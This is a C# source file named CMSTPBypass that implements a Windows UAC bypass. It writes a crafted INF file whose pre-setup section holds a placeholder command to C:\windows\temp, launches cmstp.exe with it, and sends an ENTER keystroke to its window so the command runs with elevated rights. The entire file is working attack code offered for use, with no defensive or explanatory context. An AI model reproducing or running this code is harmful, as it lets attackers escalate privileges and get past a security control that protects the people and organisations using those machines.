using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

public class CMSTPBypass
{
    public const string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

";

    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    public static void Main(string[] args)
    {
        string commandToExecute = "your_command_here"; // Replace with the actual command
        Execute(commandToExecute);
    }

    public static void Execute(string commandToExecute)
    {
        if (!File.Exists(BinaryPath))
        {
            Console.WriteLine("Could not find cmstp.exe binary!");
            return;
        }

        KillCmstpProcess();

        string infFilePath = SetInfFile(commandToExecute);

        Console.WriteLine("Payload file written to " + infFilePath);

        StartCmstpProcess(infFilePath);

        IntPtr windowHandle = IntPtr.Zero;
        do
        {
            windowHandle = SetWindowActive("cmstp");
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
    }

    public static void KillCmstpProcess()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo("taskkill")
        {
            Arguments = "/IM cmstp.exe /F",
            UseShellExecute = false,
            CreateNoWindow = true
        };
        Process.Start(startInfo)?.WaitForExit();
    }

    public static void StartCmstpProcess(string arguments)
    {
        ProcessStartInfo cmstpStartInfo = new ProcessStartInfo(BinaryPath)
        {
            Arguments = "/au " + arguments,
            UseShellExecute = false
        };
        Process.Start(cmstpStartInfo)?.WaitForExit();
    }

    public static IntPtr SetWindowActive(string processName)
    {
        Process[] target = Process.GetProcessesByName(processName);
        if (target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr windowHandle = target[0].MainWindowHandle;
        if (windowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(windowHandle);
        ShowWindow(windowHandle, 5);
        return windowHandle;
    }

    public static string SetInfFile(string commandToExecute)
    {
        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string temporaryDir = "C:\\windows\\temp";
        string outputFile = Path.Combine(temporaryDir, $"{randomFileName}.inf");
        string newInfData = InfData.Replace("REPLACE_COMMAND_LINE", commandToExecute);
        File.WriteAllText(outputFile, newInfData);
        return outputFile;
    }
}
